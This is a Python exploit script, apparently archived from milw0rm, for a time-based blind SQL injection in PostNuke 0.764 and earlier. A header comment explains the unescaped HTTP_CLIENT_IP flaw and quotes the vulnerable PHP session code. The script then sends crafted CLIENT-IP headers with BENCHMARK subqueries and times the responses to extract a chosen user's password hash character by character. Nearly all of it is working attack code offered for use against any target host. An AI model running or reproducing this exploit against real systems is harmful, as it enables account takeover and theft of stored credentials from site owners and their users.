#!/usr/bin/python
#=================================================================================================#
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                     This was a priv8 Exploit                                    #
#=================================================================================================#
#  	           		         Postnuke <= 0.764                                        #
#                                 Blind Sql Injection Vulnerability                               #
#                                         Benchmark Method                                        #
#                                                                                                 #
#                                       Vendor:   www.postnuke.com	                          #
#                                     Severity:   High                                            #
#                                       Author:   The:Paradox                                     #
#=================================================================================================#
#                                       Proud To Be Italian.                                      #
#====================================#============================================================#
# Proof Of Concept / Bug Explanation #                                                            #
#====================================#                                                            #
# Postnuke presents a critical vulnerability in pnVarPrepForStore() function. Let's see source:   #
#                                                                                                 #
#                                                                                                 #
#	1. function pnVarPrepForStore()                                                           #
#	2. {                                                                                      #
#	3.     $resarray = array();                                                               #
#	4.     foreach (func_get_args() as $ourvar) {                                             #
#	5.         if (!get_magic_quotes_runtime() && !is_array($ourvar)) {                       #
#	6.             $ourvar = addslashes($ourvar);                                             #
#	7.        	}                                                                         #
#	8.         // Add to array                                                                #
#	9.         array_push($resarray, $ourvar);                                                #
#	10.     }                                                                                 #
#	11.     // Return vars                                                                    #
#	12.     if (func_num_args() == 1) {                                                       #
#	13.         return $resarray[0];                                                          #
#	14.     } else {                                                                          #
#	15.         return $resarray;                                                             #
#	16.     }                                                                                 #
#	17. }                                                                                     #
#                                                                                                 #
# This function is used to prepare vars for sql queries. It "add slashes" to given variables.     #
# But wat happens if get_magic_quotes_runtime() is On in Server Configuration?                    #
# The script does nothing 'cause variables should be already cleaned.                             #
#                                                                                                 #
# Whatever the script author didn't thought about Server Variables: they are untouched by         #
# magic_quotes_gpc and magic_quotes_runtime().                                                    #
# Therefore all Server Variables are not propelly checked with magic_quotes_runtime() On          #
#                                                                                                 #
# In this exploit I will inject Sql code in HTTP_CLIENT_IP header, see pnSessionInit() function.  #
#=================================================================================================#
# Use this at your own risk. You are responsible for your own deeds.                              #
#=================================================================================================#
"""
                                            Related Codes:
function pnSessionInit()
{
    $dbconn =& pnDBGetConn(true);
    $pntable =& pnDBGetTables();
    // First thing we do is ensure that there is no attempted pollution
    // of the session namespace
    foreach($GLOBALS as $k => $v) {
        if (substr($k,0,4) == 'PNSV') {
            return false;
        }
    }
    // Kick it
    session_start();
    // Have to re-write the cache control header to remove no-save, this
    // allows downloading of files to disk for application handlers
    // adam_baum - no-cache was stopping modules (andromeda) from caching the playlists, et al.
    // any strange behaviour encountered, revert to commented out code.
    // Header('Cache-Control: no-cache, must-revalidate, post-check=0, pre-check=0');
    Header('Cache-Control: cache');

    $sessid = session_id();
    // Get (actual) client IP addr
    $ipaddr = pnServerGetVar('REMOTE_ADDR');
    if (empty($ipaddr)) {
        $ipaddr = pnServerGetVar('HTTP_CLIENT_IP');
    }
    $tmpipaddr = pnServerGetVar('HTTP_CLIENT_IP');
    if (!empty($tmpipaddr)) {
        $ipaddr = $tmpipaddr;
    }
    $fwdipaddr = pnServerGetVar('HTTP_X_FORWARDED_FOR');

    if (!empty($fwdipaddr) AND strpos($fwdipaddr, ',') !== false) {
        $fwdipaddr = substr($fwdipaddr,0, strpos($fwdipaddr, ','));
    }
    $tmpipaddr = $fwdipaddr;

    if (!empty($tmpipaddr) AND strpos($tmpipaddr, ',') !== false) {
        $ipaddr = substr($tmpipaddr,0, strpos($tmpipaddr, ','));
    }

    $sessioninfocolumn = &$pntable['session_info_column'];
    $sessioninfotable = $pntable['session_info'];

    $query = "SELECT $sessioninfocolumn[ipaddr]
              FROM $sessioninfotable
              WHERE $sessioninfocolumn[sessid] = '" . pnVarPrepForStore($sessid) . "'";

    $result =& $dbconn->Execute($query);

    if ($dbconn->ErrorNo() != 0) {
        return false;
    }

    if (!$result->EOF) {
// jgm - this has been commented out so that the nice AOL people
//       can view PN pages, will examine full implications of this
//       later
//        list($dbipaddr) = $result->fields;
        $result->Close();
//        if ($ipaddr == $dbipaddr) {
            pnSessionCurrent($sessid);
//        } else {
//          // Mismatch - destroy the session
//          session_destroy();
//          pnRedirect('index.php');
//          return false;
//        }
    } else {
        pnSessionNew($sessid, $ipaddr);
        // Generate a random number, used for
        // some authentication
        srand((double)microtime() * 1000000);
        pnSessionSetVar('rand', rand());
    }

    return true;
}

function pnSessionNew($sessid='', $ipaddr='')
{
    $dbconn =& pnDBGetConn(true);
    $pntable =& pnDBGetTables();

    $sessioninfocolumn = &$pntable['session_info_column'];
    $sessioninfotable = $pntable['session_info'];

    $query = "INSERT INTO $sessioninfotable
                 ($sessioninfocolumn[sessid],
                  $sessioninfocolumn[ipaddr],
                  $sessioninfocolumn[uid],
                  $sessioninfocolumn[firstused],
                  $sessioninfocolumn[lastused])
              VALUES
                 ('" . pnVarPrepForStore($sessid) . "',
                  '" . pnVarPrepForStore($ipaddr) . "', <-- Injection! =)
                  0,
                  " . time() . ",
                  " . time() . ")";

    $dbconn->Execute($query);

    if ($dbconn->ErrorNo() != 0) {
        return false;
    }

    return true;
}
"""
#=================================================================================================#
#                                      Python Exploit Starts                                      #
#=================================================================================================#

from httplib import HTTPConnection
from time import time
from sys import exit, argv, stdout

print """
#=================================================================#
#  	                 Postnuke <= 0.764                        #
#                 Blind Sql Injection Vulnerability               #
#                         Benchmark Method                        #
#                                                                 #
#                     Discovered By The:Paradox                   #
#                                                                 #
# Usage:                                                          #
#  ./pwnpn [Target] [Path] [User_id]                              #
#                                                                 #
# Example:                                                        #
#  ./pwnpn localhost /PostNuke/ 2                                 #
#  ./pwnpn www.host.com / 2                                       #
#=================================================================#
"""

if len(argv)<=3:	exit()
else:   print "[.]Exploit Starting."

prefix = "pn_"
benchmark = "230000000"
vtime = 6
port = 80

target = argv[1]
path = argv[2]
uid = argv[3]

j=1
h4sh = ""
ht = []

for k in range(48,58):
	ht.append(k)
for k in range(97,103):
	ht.append(k)
ht.append(0)

# Result Query:
# INSERT INTO pn_session_info( pn_session_info.pn_sessid, pn_session_info.pn_ipaddr, pn_session_info.pn_uid, pn_session_info.pn_firstused, pn_session_info.pn_lastused )
# VALUES ('6bc3cf4c67bb4c3b24bdd38dcd8e1b5b', '127.0.0.1', (SELECT IF((ASCII(SUBSTRING(PASSWORD,1,1))=48),benchmark(300000000, CHAR(0)), 0)
# FROM pn_users WHERE pn_uid =1)/*', 0, 0, 0)

print "[.]Blind Sql Injection Starts.\n\nHash:"
while j <= 32:
	for i in ht:
		if i == 0:	exit('[-]Exploit Failed.\n')

		start = time()
		conn = HTTPConnection(target,port)


		conn.request("GET", path + "index.php", {}, {"Accept": "text/plain","CLIENT-IP": "127.0.0.1',(SELECT IF((ASCII(SUBSTRING(pn_pass," + str(j) + ",1))=" + str(i) + "),benchmark(" + benchmark + ",CHAR(0)),0) FROM " + prefix + "users WHERE pn_uid=" + uid + "), 0, 0)/*"})
		response = conn.getresponse()
		read = response.read()

		if response.status == 404: exit('[-]Error 404. Not Found.')
		now = time()

		if now - start > vtime:
			stdout.write(chr(i))
			stdout.flush()
			h4sh += chr(i)
			j += 1
			break;

print "\n\n[+]All Done.\n-=Paradox Got This One=-"

# milw0rm.com [2008-03-21]